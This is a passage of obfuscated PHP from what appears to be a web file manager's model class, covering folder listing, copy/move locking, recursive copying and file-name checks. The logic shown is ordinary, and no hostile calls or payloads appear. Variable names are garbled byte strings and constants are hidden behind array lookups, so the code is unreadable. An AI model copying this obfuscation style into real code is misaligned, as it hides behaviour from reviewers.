$ĞÙ…„È”[636], null); unset($˜¦»Î¸ç[$ĞÙ…„È”[560]][$ĞÙ…„È”[637]]); continue; } $‡ø‰Ş» = $˜¦»Î¸ç[$ĞÙ…„È”[560]][$ĞÙ…„È”[637]]; $˜¦»Î¸ç[$ĞÙ…„È”[560]][$ĞÙ…„È”[638]] = Model($ĞÙ…„È”[622])->getInfoSimpleOuter($‡ø‰Ş»); } } unset($˜¦»Î¸ç); } public function parentLevelArray($¡àŸ­í¿) { $Ï Ó‡ûÇ =& $_SERVER[Ï×Œõ”û]; $¡àŸ­í¿ = explode($Ï Ó‡ûÇ[50], trim($¡àŸ­í¿, $Ï Ó‡ûÇ[50])); return array_to_int(array_filter($¡àŸ­í¿)); } public function listAll($¬îÚ˜Åô) { $Ó£¨ÏÎ¥ =& $_SERVER[Ï×Œõ”û]; $ì•ï—òÓ = $this->sourceInfo($¬îÚ˜Åô); $‚ùÔ’™® = array($Ó£¨ÏÎ¥[639] => array($Ó£¨ÏÎ¥[640], $ì•ï—òÓ[$Ó£¨ÏÎ¥[609]] . $¬îÚ˜Åô . $Ó£¨ÏÎ¥[641]), $Ó£¨ÏÎ¥[642] => 0); $¬ë‚éà = $Ó£¨ÏÎ¥[643]; $Ç«µûù¬ = "\x4c\105\106\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\x69\157\x5f\x66\151\x6c\145\40\x66\151\x6c\145\40\157\156\x20\x73\x6f\165\x72\143\145\56\x66\x69\154\x65\x49\x44\40\75\40\146\151\x6c\145\56\146\x69\154\x65\x49\104"; $ĞşğŞ“ê = $this->alias($Ó£¨ÏÎ¥[538])->field($¬ë‚éà)->where($‚ùÔ’™®)->join($Ç«µûù¬)->select(); $this->_listAppendAuth($ĞşğŞ“ê); $this->_listAppendUser($ĞşğŞ“ê); $this->_listAppendPath($ĞşğŞ“ê); $ĞşğŞ“ê = array_to_keyvalue($ĞşğŞ“ê, $Ó£¨ÏÎ¥[193]); $¿Šíâô = "\57{$ì•ï—òÓ[$Ó£¨ÏÎ¥[32]]}\x2f"; $¿Šíâô = $¿Šíâô == $Ó£¨ÏÎ¥[256] ? $Ó£¨ÏÎ¥[8] : $¿Šíâô; $à­å·Ò™ = array(); foreach ($ĞşğŞ“ê as $Èƒ…¯³Å => $Üè®) { $Úº°º©» = $this->parentLevelArray($Üè®[$Ó£¨ÏÎ¥[609]]); array_shift($Úº°º©»); $ƒƒç¨ŸÖ = $¿Šíâô; for ($Œ­ü“½ˆ = 0; $Œ­ü“½ˆ < count($Úº°º©»); $Œ­ü“½ˆ++) { $ƒƒç¨ŸÖ .= $ĞşğŞ“ê[$Úº°º©»[$Œ­ü“½ˆ]][$Ó£¨ÏÎ¥[32]] . $Ó£¨ÏÎ¥[8]; } $ƒƒç¨ŸÖ .= $Üè®[$Ó£¨ÏÎ¥[32]]; if ($Üè®[$Ó£¨ÏÎ¥[505]]) { $ƒƒç¨ŸÖ .= $Ó£¨ÏÎ¥[8]; } $Ú ‚„¨ò = array($Ó£¨ÏÎ¥[515] => str_replace($Ó£¨ÏÎ¥[256], $Ó£¨ÏÎ¥[8], str_replace($Ó£¨ÏÎ¥[256], $Ó£¨ÏÎ¥[8], str_replace($Ó£¨ÏÎ¥[256], $Ó£¨ÏÎ¥[8], $ƒƒç¨ŸÖ))), $Ó£¨ÏÎ¥[644] => intval($Üè®[$Ó£¨ÏÎ¥[505]]), $Ó£¨ÏÎ¥[645] => intval($Üè®[$Ó£¨ÏÎ¥[79]]), $Ó£¨ÏÎ¥[88] => intval($Üè®[$Ó£¨ÏÎ¥[88]]), $Ó£¨ÏÎ¥[90] => $this->pathInfoFilter($Üè®)); if (!$Ú ‚„¨ò[$Ó£¨ÏÎ¥[505]]) { $Ú ‚„¨ò[$Ó£¨ÏÎ¥[562]] = $Üè®[$Ó£¨ÏÎ¥[562]]; } $à­å·Ò™[] = $Ú ‚„¨ò; } $à­å·Ò™ = array_sort_by($à­å·Ò™, $Ó£¨ÏÎ¥[87]); return $à­å·Ò™; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($«¡İ¸üÓ) { $§ĞÏ¼ê =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $this->_lockCheck($§ĞÏ¼ê[646], $«¡İ¸üÓ); $ÖÏ €Ú“ = 1; $this->_lockEvent($«¡İ¸üÓ, array($§ĞÏ¼ê[647], $§ĞÏ¼ê[648]), $ÖÏ €Ú“); $this->_lockParent($«¡İ¸üÓ, array($§ĞÏ¼ê[648]), $ÖÏ €Ú“); $this->_lockEvent($«¡İ¸üÓ, array($§ĞÏ¼ê[649], $§ĞÏ¼ê[650]), $ÖÏ €Ú“); $this->_lockCheckEnd($§ĞÏ¼ê[646], $«¡İ¸üÓ); } public function lockCopyEnd($Ñ ÊÇäù) { $è²‘¥ä÷ =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $ª°Ö£ÅÄ = 0; $this->_lockEvent($Ñ ÊÇäù, array($è²‘¥ä÷[647], $è²‘¥ä÷[648]), $ª°Ö£ÅÄ); $this->_lockParent($Ñ ÊÇäù, array($è²‘¥ä÷[648]), $ª°Ö£ÅÄ); $this->_lockEvent($Ñ ÊÇäù, array($è²‘¥ä÷[649], $è²‘¥ä÷[650]), $ª°Ö£ÅÄ); } public function lockWriteStart($æòÌÀª, $ÜßÆ¢ı€ = '') { $û†şÄÕ… =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $this->_lockCheck($û†şÄÕ…[647], $æòÌÀª); $¬Üà’­¤ = 1; $this->_lockKey($û†şÄÕ…[651] . $æòÌÀª . $û†şÄÕ…[10] . $ÜßÆ¢ı€, $¬Üà’­¤); $this->_lockEvent($æòÌÀª, array($û†şÄÕ…[646], $û†şÄÕ…[648]), $¬Üà’­¤); $this->_lockParent($æòÌÀª, array($û†şÄÕ…[646], $û†şÄÕ…[648]), $¬Üà’­¤); $this->_lockCheckEnd($û†şÄÕ…[647], $æòÌÀª); } public function lockWriteEnd($ğî¹ŒÏİ, $®ãÙıÃ = '') { $Ä§•é·’ =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $€–€ç¾ì = 0; $this->_lockKey($Ä§•é·’[651] . $ğî¹ŒÏİ . $Ä§•é·’[10] . $®ãÙıÃ, $€–€ç¾ì); $this->_lockEvent($ğî¹ŒÏİ, array($Ä§•é·’[646], $Ä§•é·’[648]), $€–€ç¾ì); $this->_lockParent($ğî¹ŒÏİ, array($Ä§•é·’[646], $Ä§•é·’[648]), $€–€ç¾ì); } public function lockMoveStart($¸ô§ÍÁé) { $Ò´äÇ±Ù =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ò´äÇ±Ù[648], $¸ô§ÍÁé); $¤•ğøâ‰ = 1; $this->_lockKey($Ò´äÇ±Ù[652] . $¸ô§ÍÁé, $¤•ğøâ‰); $this->_lockEvent($¸ô§ÍÁé, array($Ò´äÇ±Ù[646], $Ò´äÇ±Ù[647]), $¤•ğøâ‰); $this->_lockParent($¸ô§ÍÁé, array($Ò´äÇ±Ù[646], $Ò´äÇ±Ù[648]), $¤•ğøâ‰); $this->_lockEvent($¸ô§ÍÁé, array($Ò´äÇ±Ù[653], $Ò´äÇ±Ù[649], $Ò´äÇ±Ù[650]), $¤•ğøâ‰); $this->_lockCheckEnd($Ò´äÇ±Ù[648], $¸ô§ÍÁé); } public function lockMoveEnd($¹ÆÙĞäá) { $ñ˜¾©ÔÆ =& $_SERVER[Ï×Œõ”û]; if (!$this->allowLock()) { return; } $ˆÔªÍà¬ = 0; $this->_lockKey($ñ˜¾©ÔÆ[652] . $¹ÆÙĞäá, $ˆÔªÍà¬); $this->_lockEvent($¹ÆÙĞäá, array($ñ˜¾©ÔÆ[646], $ñ˜¾©ÔÆ[647]), $ˆÔªÍà¬); $this->_lockParent($¹ÆÙĞäá, array($ñ˜¾©ÔÆ[646], $ñ˜¾©ÔÆ[648]), $ˆÔªÍà¬); $this->_lockEvent($¹ÆÙĞäá, array($ñ˜¾©ÔÆ[653], $ñ˜¾©ÔÆ[649], $ñ˜¾©ÔÆ[650]), $ˆÔªÍà¬); } private function _lockCheck($Ù«Ø˜ïş, $Ò´­¯Šì) { $Î†¨ÅäÌ =& $_SERVER[Ï×Œõ”û]; $·²ÀÖŒº = $this->sourceInfo($Ò´­¯Šì); $´Ÿ÷¬ = $Ù«Ø˜ïş . $Î†¨ÅäÌ[10] . $Ò´­¯Šì; $this->_lockTimeStart[$´Ÿ÷¬] = timeFloat(); if (!is_array($·²ÀÖŒº)) { return; } $Å€äùªÍ = LNG($Î†¨ÅäÌ[654]); CacheLock::setErrorMsg($Î†¨ÅäÌ[175] . htmlspecialchars($·²ÀÖŒº[$Î†¨ÅäÌ[32]]) . $Î†¨ÅäÌ[177] . $Å€äùªÍ); $this->_lockKey($´Ÿ÷¬, 1); $this->_lockKey($´Ÿ÷¬, 0); $ì½Â˜Ô = array_reverse($this->parentLevelArray($·²ÀÖŒº[$Î†¨ÅäÌ[609]])); foreach ($ì½Â˜Ô as $„üÁª’) { $´Ÿ÷¬ = $Ù«Ø˜ïş . $Î†¨ÅäÌ[655] . $„üÁª’; if (CacheLock::lockGet($Î†¨ÅäÌ[656] . $´Ÿ÷¬)) { $·²ÀÖŒº = $this->sourceInfo($„üÁª’); CacheLock::setErrorMsg($Î†¨ÅäÌ[175] . htmlspecialchars($·²ÀÖŒº[$Î†¨ÅäÌ[32]]) . $Î†¨ÅäÌ[177] . $Å€äùªÍ); $this->_lockKey($´Ÿ÷¬, 1); $this->_lockKey($´Ÿ÷¬, 0); } } } private function _lockCheckEnd($©é Šºí, $É‹Ú³–í) { $ø‹´Õò =& $_SERVER[Ï×Œõ”û]; $ûô“Ëõ = $©é Šºí . $ø‹´Õò[10] . $É‹Ú³–í; CacheLock::setErrorMsg($ø‹´Õò[464]); if (!isset($this->_lockTimeStart[$ûô“Ëõ])) { return; } $æ‹©ô¼ = timeFloat() - $this->_lockTimeStart[$ûô“Ëõ]; unset($this->_lockTimeStart[$ûô“Ëõ]); if ($æ‹©ô¼ > 0.5) { unset(self::$cacheSourceInfo[$ø‹´Õò[552] . $É‹Ú³–í]); } $»…†ğôÙ = $this->sourceInfo($É‹Ú³–í); if (!$»…†ğôÙ) { show_json(LNG($ø‹´Õò[106]), !1); } } private function _lockParent($ûİ£ûˆ¿, $‰ä¤©±‹, $ÕÅâ “) { if (!$this->autoLockSet) { return; } $…äèôí = $this->sourceInfo($ûİ£ûˆ¿); if (!is_array($…äèôí)) { return; } $Ğò­çğ‰ = array_reverse($this->parentLevelArray($…äèôí[$_SERVER[Ï×Œõ”û][609]])); foreach ($Ğò­çğ‰ as $ìóÈâœ¬) { $this->_lockEvent($ìóÈâœ¬, $‰ä¤©±‹, $ÕÅâ “); } } private function _lockEvent($ğ¸±áØ¿, $—ÓêõÔ, $íÏìî) { $¤ÇÙ¾Œ¥ =& $_SERVER[Ï×Œõ”û]; if (!$this->autoLockSet) { return; } foreach ($—ÓêõÔ as $»¯©—­‹) { $Öì·Ï® = $»¯©—­‹ . $¤ÇÙ¾Œ¥[10] . $ğ¸±áØ¿; if ($íÏìî && CacheLock::lockGet($¤ÇÙ¾Œ¥[656] . $Öì·Ï®)) { continue; } $this->_lockKey($Öì·Ï®, $íÏìî); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($×äôÛ…, $µ—©›ßê = 1) { $†õÓáÈç = $_SERVER[Ï×Œõ”û][656] . md5($×äôÛ…); if ($µ—©›ßê) { if (isset(self::$_lockItemArr[$†õÓáÈç])) { return; } self::$_lockItemArr[$†õÓáÈç] = 1; CacheLock::lock($†õÓáÈç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$†õÓáÈç])) { return; } unset(self::$_lockItemArr[$†õÓáÈç]); CacheLock::unlock($†õÓáÈç); } } public function isParentOf($Á²÷²Æë, $ˆ­®ÜÄ¬) { $…ˆ»Ï’Ñ =& $_SERVER[Ï×Œõ”û]; $ÁÇ¨Õä© = $this->sourceInfo($Á²÷²Æë); $×½Ø–ÙÄ = $this->sourceInfo($ˆ­®ÜÄ¬); $™˜Ç…ª = $ÁÇ¨Õä©[$…ˆ»Ï’Ñ[609]] . $ÁÇ¨Õä©[$…ˆ»Ï’Ñ[193]] . $…ˆ»Ï’Ñ[50]; $Ûùé‘ßã = $×½Ø–ÙÄ[$…ˆ»Ï’Ñ[609]] . $×½Ø–ÙÄ[$…ˆ»Ï’Ñ[193]] . $…ˆ»Ï’Ñ[50]; $¯Ê•ğÒ = strpos($Ûùé‘ßã, $™˜Ç…ª) === 0; return $¯Ê•ğÒ; } private $targetIsDelete = 0; public function copy($ƒàèæ¬Ú, $á¢Ê‹‘, $¬©òÈ™  = REPEAT_REPLACE, $¾ú…í²“ = '') { $î¯áşï =& $_SERVER[Ï×Œõ”û]; $üœÃÎ = $this->sourceInfo($ƒàèæ¬Ú); $úÊ“û¹ = $this->sourceInfo($á¢Ê‹‘); if (!$üœÃÎ || !$úÊ“û¹ || $úÊ“û¹[$î¯áşï[505]] != $î¯áşï[91]) { return !1; } if ($this->isParentOf($ƒàèæ¬Ú, $á¢Ê‹‘)) { return !1; } $ŠŸÃûã· = $¾ú…í²“ ? $¾ú…í²“ : $üœÃÎ[$î¯áşï[32]]; $this->lockCopyStart($ƒàèæ¬Ú); $this->lockWriteStart($á¢Ê‹‘, $ŠŸÃûã·); $”„Ûóïô = array($î¯áşï[657] => array(), $î¯áşï[658] => array(), $î¯áşï[659] => array()); $this->targetIsDelete = intval($üœÃÎ[$î¯áşï[525]]); $õŞÖ¯íù = $this->fileNameExistAuto($á¢Ê‹‘, $üœÃÎ); $ŞÁŠ‰ê = $this->_copy($ƒàèæ¬Ú, $á¢Ê‹‘, $¬©òÈ™ , $”„Ûóïô, !0, $¾ú…í²“); $this->_childrenListClear(); $this->lockCopyEnd($ƒàèæ¬Ú); $this->lockWriteEnd($á¢Ê‹‘, $ŠŸÃûã·); if ($üœÃÎ[$î¯áşï[505]] == $î¯áşï[91] && $õŞÖ¯íù == $ŞÁŠ‰ê) { $this->folderSizeResetChildren($õŞÖ¯íù); } Model($î¯áşï[660])->addAll($”„Ûóïô[$î¯áşï[658]], array(), !0); if ($õŞÖ¯íù != $ŞÁŠ‰ê || $üœÃÎ[$î¯áşï[505]] == $î¯áşï[91]) { Model($î¯áşï[661])->eventCopy($ŞÁŠ‰ê); } $this->saveAll($”„Ûóïô[$î¯áşï[659]]); Model($î¯áşï[232])->linkAdd($”„Ûóïô[$î¯áşï[657]]); $this->folderSizeReset($á¢Ê‹‘); $this->updateModifyTime($á¢Ê‹‘); return $ŞÁŠ‰ê; } private function _copy($û×é¯ö·, $¦íšûÏŸ, $Ë‘«˜€, &$Œ¼óóàº, $Ñ—…‘şù, $ˆŸƒñß³ = '') { $Ä‘áâ—È =& $_SERVER[Ï×Œõ”û]; $ó…Ë•‡¶ = $this->sourceInfoCache($û×é¯ö·); $§ŸİŠÅ  = $ó…Ë•‡¶[$Ä‘áâ—È[505]] == $Ä‘áâ—È[91]; $òëÜÊÆ‰ = $ˆŸƒñß³ ? $ˆŸƒñß³ : $ó…Ë•‡¶[$Ä‘áâ—È[32]]; $ŠÊÀÊƒ° = $this->fileNameExistAuto($¦íšûÏŸ, $ó…Ë•‡¶); if ($Ñ—…‘şù) { $this->_childrenAllMake($û×é¯ö·); if ($§ŸİŠÅ  && $ŠÊÀÊƒ°) { $this->_childrenAllMake($ŠÊÀÊƒ°); } } if (!$ŠÊÀÊƒ°) { return $this->_copyCreate($û×é¯ö·, $¦íšûÏŸ, $òëÜÊÆ‰, $Œ¼óóàº); } $’‹İâô– = $ŠÊÀÊƒ°; if ($§ŸİŠÅ ) { if ($Ë‘«˜€ == REPEAT_RENAME_FOLDER) { $òëÜÊÆ‰ = $this->fileNameAutoCache($¦íšûÏŸ, $òëÜÊÆ‰, $Ë‘«˜€, $§ŸİŠÅ ); $’‹İâô– = $this->_copyCreate($û×é¯ö·, $¦íšûÏŸ, $òëÜÊÆ‰, $Œ¼óóàº); } else { $¡Œ²âè• = $this->_childrenList($û×é¯ö·); foreach ($¡Œ²âè• as $Çƒ”éÎÊ) { $this->_copy($Çƒ”éÎÊ[$Ä‘áâ—È[193]], $ŠÊÀÊƒ°, $Ë‘«˜€, $Œ¼óóàº, !1); } } } else { if ($Ë‘«˜€ == REPEAT_RENAME || $Ë‘«˜€ == REPEAT_RENAME_FOLDER) { $òëÜÊÆ‰ = $this->fileNameAutoCache($¦íšûÏŸ, $òëÜÊÆ‰, $Ë‘«˜€, $§ŸİŠÅ ); $’‹İâô– = $this->_copyCreate($û×é¯ö·, $¦íšûÏŸ, $òëÜÊÆ‰, $Œ¼óóàº); } else { if ($Ë‘«˜€ == REPEAT_REPLACE) { $ğ¿Çü´ = $this->sourceInfoCache($ŠÊÀÊƒ°); $ÄğÒÜ• = $this->fileHistory($ğ¿Çü´, $ó…Ë•‡¶[$Ä‘áâ—È[562]], $ó…Ë•‡¶[$Ä‘áâ—È[79]]); if ($ÄğÒÜ•) { $Œ¼óóàº[$Ä‘áâ—È[657]][] = $ó…Ë•‡¶[$Ä‘áâ—È[562]]; } } else { if ($Ë‘«˜€ == REPEAT_SKIP) { } } } Hook::trigger($Ä‘áâ—È[662], array($Ä‘áâ—È[663], $ó…Ë•‡¶, 0)); } return $’‹İâô–; } private function _copyCreate($åèÙÔÕ, $ø¸€ËĞ¯, $ƒÈ÷´¬å, &$ÑŠ˜’Ñ›) { $¤•¥â˜ =& $_SERVER[Ï×Œõ”û]; $‚äãÂü = $this->sourceInfoCache($åèÙÔÕ); $ÔÎñ²¥ = $this->sourceInfoCache($ø¸€ËĞ¯); $ÕŒ“§« = $this->_makeItemData($‚äãÂü, $ÔÎñ²¥, $ƒÈ÷´¬å); Hook::trigger($¤•¥â˜[664], $ÕŒ“§«); Hook::trigger($¤•¥â˜[665], array($¤•¥â˜[666], $ÕŒ“§«, 0)); $… áæ€Ô = $this->add($ÕŒ“§«); $åÙßÌÛÙ = array($¤•¥â˜[193] => $… áæ€Ô, $¤•¥â˜[32] => $ƒÈ÷´¬å); $this->_copyApplyMeta($åÙßÌÛÙ, $ÑŠ˜’Ñ›); if ($‚äãÂü[$¤•¥â˜[505]] != $¤•¥â˜[91]) { $ÑŠ˜’Ñ›[$¤•¥â˜[657]][] = $‚äãÂü[$¤•¥â˜[562]]; return $… áæ€Ô; } $êÓ¬¦Ñè = array(); $ÃîéŞß– = array(); $this->_childrenListAll($åèÙÔÕ, $êÓ¬¦Ñè); $‘Øª…û = count($êÓ¬¦Ñè); if ($‘Øª…û == 0) { return $… áæ€Ô; } $øşŠé„à = $this->sourceInfo($… áæ€Ô); foreach ($êÓ¬¦Ñè as $ì§Å½¤ô) { $£úÎĞÛ¡ = $this->_makeItemData($ì§Å½¤ô, $øşŠé„à, $ì§Å½¤ô[$¤•¥â˜[32]]); $£úÎĞÛ¡[$¤•¥â˜[609]] = $ì§Å½¤ô[$¤•¥â˜[609]]; $ÃîéŞß–[] = $£úÎĞÛ¡; } $this->chunkEventSet($¤•¥â˜[667], array($¤•¥â˜[668], $ÕŒ“§«, $‘Øª…û)); $this->addAll($ÃîéŞß–, array(), !1); $â±Ø€çâ = $this->where(array($¤•¥â˜[192] => $… áæ€Ô))->select(); $ÖÒÒ¶ìû = $this->_childrenMakeRelation($êÓ¬¦Ñè, $â±Ø€çâ); $ÖÒÒ¶ìû[$åèÙÔÕ] = $… áæ€Ô; $õÙÄ€ÖÑ = array(); $áÍÚØíò = array(); foreach ($â±Ø€çâ as $ì§Å½¤ô) { $ÑÉ™÷°… = $ì§Å½¤ô[$¤•¥â˜[193]]; $õù­¹‘Ø = $this->_childrenMatch($ÖÒÒ¶ìû, $ì§Å½¤ô, $øşŠé„à); $õÙÄ€ÖÑ[] = array($¤•¥â˜[193], $ÑÉ™÷°…, $¤•¥â˜[192], $õù­¹‘Ø[$¤•¥â˜[192]]); $áÍÚØíò[] = array($¤•¥â˜[193], $ÑÉ™÷°…, $¤•¥â˜[609], $õù­¹‘Ø[$¤•¥â˜[609]]); $this->_copyApplyMeta($ì§Å½¤ô, $ÑŠ˜’Ñ›); if ($ì§Å½¤ô[$¤•¥â˜[505]] != $¤•¥â˜[91]) { $ÑŠ˜’Ñ›[$¤•¥â˜[657]][] = $ì§Å½¤ô[$¤•¥â˜[562]]; } } $this->chunkEventSet($¤•¥â˜[669], array($¤•¥â˜[670], $ÕŒ“§«, $‘Øª…û)); $this->saveAll($õÙÄ€ÖÑ); $this->chunkEventSet($¤•¥â˜[671], array($¤•¥â˜[672], $ÕŒ“§«, $‘Øª…û)); $this->saveAll($áÍÚØíò); return $… áæ€Ô; } private function _childrenMakeRelation($ Ã¾³¡ş, $ÇÁÏ°ç”) { $óá‚°“Ä =& $_SERVER[Ï×Œõ”û]; $©›ä¼¡® = array(); $ñû¼ÎÀƒ = array(); foreach ($ Ã¾³¡ş as $øÃ¼ºÂÌ) { $¸àñÚìÜ = $øÃ¼ºÂÌ[$óá‚°“Ä[32]] . $óá‚°“Ä[8] . $øÃ¼ºÂÌ[$óá‚°“Ä[609]]; $©›ä¼¡®[$¸àñÚìÜ] = $øÃ¼ºÂÌ[$óá‚°“Ä[193]]; } foreach ($ÇÁÏ°ç” as $øÃ¼ºÂÌ) { $¸àñÚìÜ = $øÃ¼ºÂÌ[$óá‚°“Ä[32]] . $óá‚°“Ä[8] . $øÃ¼ºÂÌ[$óá‚°“Ä[609]]; $·ıÚÊµ— = $©›ä¼¡®[$¸àñÚìÜ]; $ñû¼ÎÀƒ[$·ıÚÊµ—] = $øÃ¼ºÂÌ[$óá‚°“Ä[193]]; } return $ñû¼ÎÀƒ; } private function _childrenMatch($‘ğ¤‚¶, $—öÁƒ­, $Óúã¹Çö) { $„Ã–õÕú =& $_SERVER[Ï×Œõ”û]; $Á†—²”Ë = $Óúã¹Çö[$„Ã–õÕú[609]]; $°ÍĞü„× = $this->parentLevelArray($—öÁƒ­[$„Ã–õÕú[609]]); foreach ($°ÍĞü„× as $û¤çÄ·Ø) { if (isset($‘ğ¤‚¶[$û¤çÄ·Ø])) { $Á†—²”Ë .= $‘ğ¤‚¶[$û¤çÄ·Ø] . $„Ã–õÕú[673]; } } $Á†—²”Ë = rtrim($Á†—²”Ë, $„Ã–õÕú[50]) . $„Ã–õÕú[50]; $Ù‚Âì  = $this->parentLevelArray($Á†—²”Ë); $ôãı¸—ğ = $Ù‚Âì [count($Ù‚Âì ) - 1]; return array($„Ã–õÕú[192] => $ôãı¸—ğ, $„Ã–õÕú[609] => $Á†—²”Ë); } private function _makeItemData($™‰»Óå, $¡¤æ©—ê, $Š³‡ºÇÉ) { $ºÛÉéèá =& $_SERVER[Ï×Œõ”û]; $ë ¨‰ö = array($ºÛÉéèá[674] => $™‰»Óå[$ºÛÉéèá[505]], $ºÛÉéèá[514] => $Š³‡ºÇÉ, $ºÛÉéèá[675] => $™‰»Óå[$ºÛÉéèá[506]] ? $™‰»Óå[$ºÛÉéèá[506]] : $ºÛÉéèá[12], $ºÛÉéèá[563] => $™‰»Óå[$ºÛÉéèá[562]] ? $™‰»Óå[$ºÛÉéèá[562]] : 0, $ºÛÉéèá[645] => $™‰»Óå[$ºÛÉéèá[79]] ? $™‰»Óå[$ºÛÉéèá[79]] : 0, $ºÛÉéèá[676] => intval($¡¤æ©—ê[$ºÛÉéèá[190]]), $ºÛÉéèá[677] => intval($¡¤æ©—ê[$ºÛÉéèá[594]]), $ºÛÉéèá[678] => intval(USER_ID), $ºÛÉéèá[679] => intval(USER_ID), $ºÛÉéèá[497] => intval($¡¤æ©—ê[$ºÛÉéèá[193]]), $ºÛÉéèá[680] => $¡¤æ©—ê[$ºÛÉéèá[609]] . $¡¤æ©—ê[$ºÛÉéèá[193]] . $ºÛÉéèá[50], $ºÛÉéèá[518] => $™‰»Óå[$ºÛÉéèá[88]] ? $™‰»Óå[$ºÛÉéèá[88]] : time(), $ºÛÉéèá[524] => 0, $ºÛÉéèá[681] => $ºÛÉéèá[12]); return $ë ¨‰ö; } private function _copyApplyMeta($‰ºéçş°, &$ŞÙæ­¹è) { $æëàØÌ† =& $_SERVER[Ï×Œõ”û]; $ï»“µ‹± = $‰ºéçş°[$æëàØÌ†[193]]; $û¼ëÙæä = $‰ºéçş°[$æëàØÌ†[32]]; if (!isset($‰ºéçş°[$æëàØÌ†[682]]) || !$‰ºéçş°[$æëàØÌ†[682]] || $‰ºéçş°[$æëàØÌ†[682]] == $æëàØÌ†[230]) { $ŞÙæ­¹è[$æëàØÌ†[659]][] = array($æëàØÌ†[193], $ï»“µ‹±, $æëàØÌ†[682], short_id($ï»“µ‹±)); } if (Input::check($û¼ëÙæä, $æëàØÌ†[683])) { $ŞÙæ­¹è[$æëàØÌ†[658]][] = array($æëàØÌ†[193] => $ï»“µ‹±, $æëàØÌ†[95] => $æëàØÌ†[557], $æëàØÌ†[452] => str_replace($æëàØÌ†[53], $æëàØÌ†[12], Pinyin::get($û¼ëÙæä))); $ŞÙæ­¹è[$æëàØÌ†[658]][] = array($æëàØÌ†[193] => $ï»“µ‹±, $æëàØÌ†[95] => $æëàØÌ†[556], $æëàØÌ†[452] => Pinyin::get($û¼ëÙæä, $æëàØÌ†[684])); } $ŞÙæ­¹è[$æëàØÌ†[658]][] = array($æëàØÌ†[193] => $ï»“µ‹±, $æëàØÌ†[95] => $æëàØÌ†[536], $æëàØÌ†[452] => KodSort::makeStr($û¼ëÙæä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($§ÍºôÌ ) { $Ì¦ï“ï =& $_SERVER[Ï×Œõ”û]; $¼ïùŠÒ = $this->sourceInfo($§ÍºôÌ ); $¥€‡®Î† = $Ì¦ï“ï[685]; $ãüĞÒß = array($Ì¦ï“ï[609] => array($Ì¦ï“ï[640], $¼ïùŠÒ[$Ì¦ï“ï[609]] . $§ÍºôÌ  . $Ì¦ï“ï[641]), $Ì¦ï“ï[525] => $this->targetIsDelete); $şëŸ¥ğ  = $this->field($¥€‡®Î†)->where($ãüĞÒß)->select(); if (!$şëŸ¥ğ ) { return; } $şëŸ¥ğ  = array_to_keyvalue($şëŸ¥ğ , $Ì¦ï“ï[193]); foreach ($şëŸ¥ğ  as $”¨şÛæ) { $’™ğõÃ = $”¨şÛæ[$Ì¦ï“ï[192]]; $§ÍºôÌ  = $”¨şÛæ[$Ì¦ï“ï[193]]; if (!isset($this->_childrenListCache[$§ÍºôÌ ]) && $”¨şÛæ[$Ì¦ï“ï[505]] == $Ì¦ï“ï[91]) { $this->_childrenListCache[$§ÍºôÌ ] = array(); } if (!isset($this->_childrenListCache[$’™ğõÃ])) { $this->_childrenListCache[$’™ğõÃ] = array(); } $this->_childrenListCache[$’™ğõÃ][$§ÍºôÌ ] = $”¨şÛæ; $this->_childrenItemCache[$§ÍºôÌ ] = $”¨şÛæ; } } private function _childrenListAll($Ñ¶ÕÇàÈ, &$±»š™ö¤) { $–Æ½Ğ¨Ê =& $_SERVER[Ï×Œõ”û]; if (!isset($this->_childrenListCache[$Ñ¶ÕÇàÈ])) { return; } $èªç¸í = $this->_childrenListCache[$Ñ¶ÕÇàÈ]; foreach ($èªç¸í as $Õ•ÁŸÈº => $ˆ™®€î·) { $±»š™ö¤[$Õ•ÁŸÈº] = $ˆ™®€î·; if ($ˆ™®€î·[$–Æ½Ğ¨Ê[505]] == $–Æ½Ğ¨Ê[91]) { $this->_childrenListAll($Õ•ÁŸÈº, $±»š™ö¤); } } } private function sourceInfoCache($ÖŠÙîÇ¦) { if (isset($this->_childrenItemCache[$ÖŠÙîÇ¦])) { return $this->_childrenItemCache[$ÖŠÙîÇ¦]; } return $this->sourceInfo($ÖŠÙîÇ¦); } private function _childrenList($ûíğ±ƒÓ) { if (isset($this->_childrenListCache[$ûíğ±ƒÓ])) { return $this->_childrenListCache[$ûíğ±ƒÓ]; } return $this->_childrenListSelect($ûíğ±ƒÓ); } private function _childrenListSelect($¹§Œï¸©) { $Áé•†æ =& $_SERVER[Ï×Œõ”û]; $ığÆãúá = array($Áé•†æ[192] => $¹§Œï¸©, $Áé•†æ[525] => $this->targetIsDelete); $£—œ‹ı¸ = $this->where($ığÆãúá)->select(); $£—œ‹ı¸ = $£—œ‹ı¸ ? $£—œ‹ı¸ : array(); $ø€ú‹´Å = array_to_keyvalue($£—œ‹ı¸, $Áé•†æ[193]); $this->_childrenListCache[$¹§Œï¸©] = $ø€ú‹´Å; foreach ($ø€ú‹´Å as $¹§Œï¸© => $¦·ó€) { $this->_childrenItemCache[$¹§Œï¸©] = $¦·ó€; } return $ø€ú‹´Å; } private function fileNameExistAuto($ëõËšú, $ë¦Æ¹œ) { $ƒÙĞ™úÄ =& $_SERVER[Ï×Œõ”û]; if ($ë¦Æ¹œ[$ƒÙĞ™úÄ[525]] == $ƒÙĞ™úÄ[91]) { return $this->fileNameExist($ëõËšú, $ë¦Æ¹œ[$ƒÙĞ™úÄ[32]]); } return $this->fileNameExistCache($ëõËšú, $ë¦Æ¹œ[$ƒÙĞ™úÄ[32]]); } private function fileNameExistCache($¤´äØ¨’, $ÄëÀÔÅù) { $õØªÜš =& $_SERVER[Ï×Œõ”û]; $ÄëÀÔÅù = strtolower($ÄëÀÔÅù); $Š¶¯›êû = $this->_childrenList($¤´äØ¨’); foreach ($Š¶¯›êû as $†ôµùÏç) { if ($ÄëÀÔÅù == strtolower($†ôµùÏç[$õØªÜš[32]])) { return 